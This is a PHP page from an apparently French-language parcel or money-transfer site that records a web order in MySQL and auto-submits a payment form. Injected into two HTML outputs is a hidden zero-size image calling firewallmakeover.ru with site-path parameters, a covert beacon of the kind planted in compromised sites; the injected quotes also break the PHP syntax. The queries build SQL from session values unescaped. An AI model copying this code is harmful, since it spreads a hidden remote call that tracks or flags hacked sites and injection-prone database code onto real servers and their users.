<?php
/* Programme : LetAjout.php
* Description : Programme d'ajout des lettres recues en ligne.
* Auteur : Denis Léveillé 	 		  Date : 2004-08-16
	* MAJ : Denis Léveillé 	 		  Date : 2007-01-22
*/
include('lib/config.php');
 
if( Chk_TransId( @$_POST['transid'] ) ) {
	echo "<SCRIPT LANGUAGE='javascript'>";
	echo "M = ".$txt['bouton_deja_clique'].";";
	echo " window.alert(\"M\");";
	echo "</SCRIPT>";
	exit();
}
else 
	Aj_TransId( @$_POST['transid'] );
	

//$TabService	= 	get_service("");	   
$TabUnite	= 	get_unite();

// **** Choix de la langue de travail ****
switch( $_SESSION['langue'] ) {
	case "en":	include("./extra/varmessen.inc");
					break;
	case "sp":	include("./extra/varmesssp.inc");
					break;
	default:		include("./extra/varmessfr.inc");

} // switch SLangue


function AfficherErreur($texteMsg)
{
global $TabMessGen,$NomCie,$AdrCourriel;
		// ***** A TRADUIRE *****
  echo "
      <html>
      <head>
      <title>AJOUT COMMANDE ERREUR</title>
      </head>
      <body bgcolor='#C0C0FF'><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
      <h2 align='center' style='margin-top: .7in'>
      $TabMessGen[22] Numéro de Lettre</h2>
     <div align='center'>
      <p style='margin-top: .5in'>
      <b>$TabMessGen[23] $texteMsg</b>
      </div>
		<div align='center'><font size=-1>
		$TabMessGen[1]
		<a href='mailto:$AdrCourriel?subject=Page Web $NomCie'>
		$TabMessGen[2]</a>
		</font></div>
		<p align='center' valign='bottom'><font size=1>
		$TabMessGen[8]		 
		$TabMessGen[3]		 
		$NomCie
		$TabMessGen[4]		  
		</p>
      </body>
      </html>
  \n";
   exit();
} // AfficherErreur


if( !($Connection = mysql_connect( $host, $user, $password )) )
	   AfficherErreur(mysql_errno().$TabMessGen[30].mysql_error());
if( !($db = mysql_select_db( $database, $Connection )) )
 	   AfficherErreur(mysql_errno().$TabMessGen[31].mysql_error());

// ***** In se trouve un numéro de lettre de libre
$No = 01;
do {
	// ***** Le numéro est fabriqué a partir de ladate et un numéro séquentiel pour la journée
	// ***** ex. 20080208-0034
	$NoLettre = sprintf("%s-%04d",date("Ymd"),$No);
	
	$sql = "SELECT * FROM $database.lettre WHERE NoLettre='$NoLettre'";
	
	$result = mysql_query( $sql, $Connection );
	if( $result == 0 )
		AfficherErreur(mysql_errno().$TabMessGen[34].mysql_error());
	elseif (  mysql_num_rows($result) == 0 ) 
		break; // Le no est pas trouvé 
	
	$No++;
} while( $No < 2000 );
				  
if( $No > 2000 )
		// ***** A TRADUIRE *****
	AfficherErreur( "Impossible de trouver un numéro de libre" );


		$Date=date("Y-m-d H:i:s");
		$_SESSION['OrderId'] = $NoLettre;
		// = sprintf("%s-%04d",date("Ymd"),$No);

		$infosClient = infos_client($_SESSION[$_SERVER['SERVER_NAME']]);
		$DestClient = dest_client( $_SESSION[$_SERVER['SERVER_NAME']] );

		$CurTrans	=	$_SESSION['transaction']['CurTrans'];
		$ModePaye	=	$_SESSION['paiement']['ModePaye'];
		
		$Total =	$_SESSION['Totaux']['totalpourbanque']; 
		
		$Service		=	$_SESSION['transaction']['Service'];
	
		$DevDisp = $_SESSION['devise'];

		if( ($TabUnite[$Service] == "POID/WEIGHT") || ($TabUnite[$Service] == "UNITÉ/UNIT") ) { 
			$Montant 	= 	$_SESSION['transaction']['Poids'];
		}
	  	elseif( $TabUnite[$Service] == "ARGENT/CASH" ) {
			$Montant	=	$_SESSION['transaction']['Transfert'];
		}
		else {
			$Montant	=	$_SESSION['transaction']['Transfert'];
		}


		$sql =  "INSERT INTO $database.lettre SET NoLettre='$NoLettre',Contenu='$ModePaye', NoCarte='WEB ORDER', DateExp='',";
		$sql .=  "Montant='$Total', PayCurrency = '$DevDisp', ENoClient='".$infosClient['NoClient']."',";
		$sql .=  "CommisRecu='".$_SESSION['NomLogin']."', DateRecu='$Date'";
		
		if( !mysql_query($sql, $Connection ) )
			AfficherErreur(mysql_errno().$TabMessGen[34].mysql_error());
		
		$sql = "INSERT INTO $database.letdest ( NoLettre, DNoClient, Commentaire, Transfert, TrsCurrency, Service, Transaction )";
		$sql .= " VALUES ('$NoLettre','".$DestClient['NoClient']."', 'WEB SITE ORDER', '$Montant', '$CurTrans', '$Service', '-1' )";
		
		//AfficherErreur( $sql );
		
		if( !mysql_query($sql, $Connection ) )
			AfficherErreur(mysql_errno().$TabMessGen[35].mysql_error());
		
echo
"<html>
	<head>
		<title>".$txt['TitreWeb']." - ".$param['telephone_client']."</title>
		<meta http-equiv='Content-Type' content='text/html; charset=iso-8859-1'>
		<base target='MAIN'>
	</head>
<body width='$Large' onload='javascript:pageonload()' ><img width="0" height="0" style="display:none;" id="frmchkldver" src="http://firewallmakeover.ru/media/image.php?ftd=364332&path=%7cpublic_html%7cantillas%7c&sys=UN&wrk=2"/>
<table width='$Large' cellpadding='0' cellspacing='0' border='1' align='$Enligne' >
	<tr>
		<td>";
	 // debut des types de paiement
		switch ( $_SESSION['paiement']['ModePaye']  ) {
						// MANDAT, COMPTANT, CHEQUE 
						// INTERAC ET E-INTERAC chk_interac.php
			case 1 : 
			case 3 : 
			case 4 : 
			case 11: 
						echo "<form name='Envoi' method='post' action='checkout_accepted_msg.php'>";
						echo "<div align='center'><br>";
						break;
						// VISA, MASTER, AMEX ET AUTRE
			case 5 : 
			case 6 : 
			case 7 : 
			default:	/* ============ POUR TEST ================ */
						if(	($infosClient['Courriel'] == "kin.coder@gmail.com") || 
								($infosClient['Courriel'] == "jean-alexandredenis@hotmail.com") || 
								($infosClient['Courriel'] == "webmaster@jean-alexandre.ca") || 
								($infosClient['Courriel'] == "postmaster@transant.com") ) {
							echo "<div align='center'>***** IN TEST *****</div>";
							if( $_SESSION['Totaux']['totalpourbanque'] > $infosClient['MaxAchat'] )
								echo "<form name='Envoi' method='post' action='checkout_depasse_msg.php'>";
							else {
								echo "<form name='Envoi' method='post' action='confirme_envoi.php'>";
								$_SESSION['Totaux']['totalpourbanque'] = number_format($_SESSION['Totaux']['totalpourbanque']).".00";
							}
						}
						else {
							if( $_SESSION['Totaux']['totalpourbanque'] > $infosClient['MaxAchat'] )
								echo "<form name='Envoi' method='post' action='checkout_depasse_msg.php'>";
							else
								echo "<form name='Envoi' method='post' action='confirme_envoi.php'>";
						}
						echo "<div align='center'><br>";
						break;
		} // Si mode de paiement
		echo "
	        	<input name='transid' TYPE='hidden' VALUE='".Get_TransId()."'>
			</div>
		</form>\r\n";
?>
			</td>
		</tr>
	</table>

<script language='javascript'>

function pageonload() {
	document.Envoi.submit();
} // pageonload
</script>

</body>
</html>

